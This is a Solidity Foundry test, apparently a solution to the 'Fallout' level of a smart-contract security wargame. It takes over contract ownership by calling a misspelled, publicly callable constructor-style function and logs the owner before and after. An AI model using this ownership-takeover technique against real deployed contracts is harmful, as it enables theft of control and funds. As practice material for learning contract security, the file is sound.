// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/level02.sol";

contract POC is Test {
    Fallout level02 = new Fallout();

    function testLevel02() external {
        console.log("Current Owner is: ", level02.owner());

        level02.Fal1out();

        console.log("New Owner is: ", level02.owner());
    }
}
